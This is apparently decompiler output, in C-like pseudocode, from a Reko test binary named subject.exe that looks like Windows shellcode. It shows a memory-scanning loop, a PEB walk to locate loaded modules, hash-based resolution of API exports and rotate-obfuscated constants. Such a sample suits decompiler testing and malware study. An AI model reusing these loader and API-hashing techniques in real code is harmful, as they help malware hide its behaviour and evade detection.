// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040108B: Register DWORD Win32CrtStartup()
DWORD Win32CrtStartup()
{
	word32 ecx_4 = __rol(0x21FFFFFF, 0x07);
	word32 esi_23 = __ror(4291151914, 0x07) + dwArg00;
	word32 edx_254 = Mem0[__rol(155616, 0x03) + (fp & __ror(0x3FC0, 0x06)):word32];
l004010C5:
	edx_254 = edx_254 + 0x01;
	if (Mem0[edx_254 + 0x00:word32] != ecx_4)
	{
		byte Z_265 = cond(Mem0[edx_254 + 0x00:word32] - esi_23);
		do
		{
			if (Z_265)
				goto l004010C5;
			edx_254 = edx_254 - 0x01;
			byte al_279 = (byte) __rol(0x40000002, 0x06);
			Z_265 = cond(Mem0[edx_254 + 0x00:byte] - al_279);
		} while (Mem0[edx_254 + 0x00:byte] != al_279);
	}
	else
	{
		edx_254 = edx_254 + 0x04;
		if (Mem0[edx_254 + 0x04:byte] != (byte) __rol(0xFC000003, 0x06))
		{
			Mem296[ecx_4 + 0x610A41E1:word32] = Mem0[ecx_4 + 0x610A41E1:word32] + 0x01;
l00401102:
			word32 edx_53 = __ror(edx_254, 0x10);
			word32 ecx_55 = dwArg00;
			do
			{
				word32 edi_66 = __rol(0x18000006, 0x05);
				ecx_55 = ecx_55 - 0x01;
				esi_23 = __rol(esi_23, 0x11);
			} while (Mem0[ecx_55 + 0x00:word32] == edi_66);
			word32 esp_76;
			word32 esi_77;
			word32 ecx_78;
			byte C_79;
			word32 edi_80;
			byte SZO_81;
			word32 eax_82;
			word32 edx_83;
			byte SCZO_84;
			byte Z_85;
			byte al_86;
			selector fs_87;
			word16 dx_88;
			word32 ebp_89;
			word16 si_90;
			word32 ebx_91;
			selector ds_92;
			word16 cx_93;
			ecx_55();
			__rol(eax_82, 0x18);
			word32 esi_100 = Mem0[fs_87:0x30:word32];
			word32 edi_108 = Mem0[Mem0[esi_100 + 0x0C:word32] + 0x1C:word32];
			word16 si_110 = __ror((word16) (esi_100 + 0x0C), 0x06);
			word32 ecx_114 = Mem0[Mem0[edi_108 + 0x00:word32] + 0x08:word32];
			Mem119[esp_76 - 0x04 + 0x00:word32] = 414199694;
			Mem124[esp_76 - 0x08 + 0x00:word32] = ecx_114;
			word32 edi_126 = fn0040143B((word16) ecx_114, DPB(esi_100 + 0x0C, si_110, 0), dwArg00, dwArg04);
			word32 edx_130 = __ror(0x3600, 0x07);
			word32 ecx_134 = __rol(0x36321736, 0x01);
			Mem136[esp_76 - 0x04 + 0x00:word32] = edx_130;
			Mem139[esp_76 - 0x08 + 0x00:word32] = ecx_134;
			word32 esi_144 = __rol(0x9B191D1B, 0x02);
			Mem147[esp_76 - 0x0C + 0x00:word32] = esi_144;
			Mem152[esp_76 - 0x10 + 0x00:word32] = esp_76 - 0x0C;
			word32 esp_153;
			word32 esi_154;
			word32 ecx_155;
			byte C_156;
			word32 edi_157;
			byte SZO_158;
			word32 eax_159;
			word32 edx_160;
			byte SCZO_161;
			byte Z_162;
			byte al_163;
			selector fs_164;
			word16 dx_165;
			word32 ebp_166;
			word16 si_167;
			word32 ebx_168;
			selector ds_169;
			word16 cx_170;
			edi_126();
			Mem173[esp_153 + 0x08:word32] = ~0x1B251B1D;
			Mem178[esp_153 + 0x04:word32] = eax_159;
			word32 edi_179 = fn0040143B(cx_170, esi_154, dwArg00, dwArg04);
			Mem185[esp_153 + 0x08:word32] = 0x00;
			Mem188[esp_153 + 0x04:word32] = 0x00;
			Mem191[esp_153 + 0x00:word32] = 0x00;
			Mem193[esp_153 - 0x04 + 0x00:word32] = 0x00D0FA18;
			Mem195[esp_153 - 0x08 + 0x00:word32] = ~0x540B0078;
			Mem197[esp_153 - 0x0C + 0x00:word32] = 101;
			word32 esp_198;
			word32 esi_199;
			word32 ecx_200;
			byte C_201;
			word32 edi_202;
			byte SZO_203;
			word32 eax_204;
			word32 edx_205;
			byte SCZO_206;
			byte Z_207;
			byte al_208;
			selector fs_209;
			word16 dx_210;
			word32 ebp_211;
			word16 si_212;
			word32 ebx_213;
			selector ds_214;
			word16 cx_215;
			edi_179();
			word32 ecx_225 = Mem197[2581580:word32];
			word32 edx_227 = __rol(DPB(edx_205, dx_210 - ~0x16, 0), 0x13);
			word32 esp_229;
			word32 esi_230;
			word32 ecx_231;
			byte C_232;
			word32 edi_233;
			byte SZO_234;
			word32 eax_235;
			word32 edx_236;
			byte SCZO_237;
			byte Z_238;
			byte al_239;
			selector fs_240;
			word16 dx_241;
			word32 ebp_242;
			word16 si_243;
			word32 ebx_244;
			selector ds_245;
			word16 cx_246;
			ecx_225();
			Mem248[eax_235 + 0x00:word32] = Mem197[eax_235 + 0x00:word32] | ecx_231;
		}
	}
	goto l00401102;
}

// 0040143B: Register word32 fn0040143B(Register word16 cx, Register word32 esi, Stack word32 dwArg04, Stack word32 dwArg08)
word32 fn0040143B(word16 cx, word32 esi, word32 dwArg04, word32 dwArg08)
{
fn0040143B_entry:
	def cx
	def dwArg04
	def Mem0
	def dwArg08
	__ror(cx, 0x02)
	ecx_38 = Mem0[dwArg04 - ~0x77 + Mem0[dwArg04 + 0x3C:word32]:word32] - ~0x1B + dwArg04
	edi_41 = Mem0[ecx_38 + 0x00:word32] + dwArg04
	ecx_48 = Mem0[ecx_38 + 0x04:word32] + dwArg04
	eax_56 = Mem0[ecx_38 + 0x08:word32] + dwArg04
	__wait()
	__wait()
	edi_67 = ecx_48
	dwLoc1C_73 = 0x00
	eax_76 = dwArg04 + Mem0[ecx_48 + 0x00:word32]
	ecx_80 = 0x00
	cl_82 = 0x00 (alias)
	goto l004014BF
l0040143B:
l004014BF:
	dwLoc1C_85 = PHI(dwLoc1C_73, dwLoc1C_85, dwLoc1C_110)
	edi_86 = PHI(edi_67, edi_86, edi_111)
	eax_87 = PHI(eax_76, eax_99, eax_113)
	ecx_88 = PHI(ecx_80, ecx_96, ecx_115)
	cl_89 = PHI(cl_82, cl_98, cl_117)
	ecx_95 = __ror(DPB(ecx_88, cl_89 + Mem0[eax_87 + 0x00:byte], 0), 0x17)
	ecx_96 = ecx_95 ^ 1200148887
	cl_98 = (byte) (ecx_95 ^ 1200148887) (alias)
	eax_99 = eax_87 + 0x01
	branch Mem0[eax_99 + 0x00:byte] != 0x00 l004014BF
l004014D1:
	branch (ecx_95 ^ 1200148887 ^ dwArg08) == 0x00 l004014F0
l004014D8:
	edi_111 = edi_86 - ~0x03
	dwLoc1C_110 = dwLoc1C_85 + 0x01
	eax_113 = Mem0[edi_111 + 0x00:word32] + dwArg04
	ecx_115 = 0x00
	cl_117 = 0x00 (alias)
	goto l004014BF
l004014F0:
	return edi_41[(word32) eax_56[dwLoc1C_85 * 0x02] * 0x04] + dwArg04
fn0040143B_exit:
}

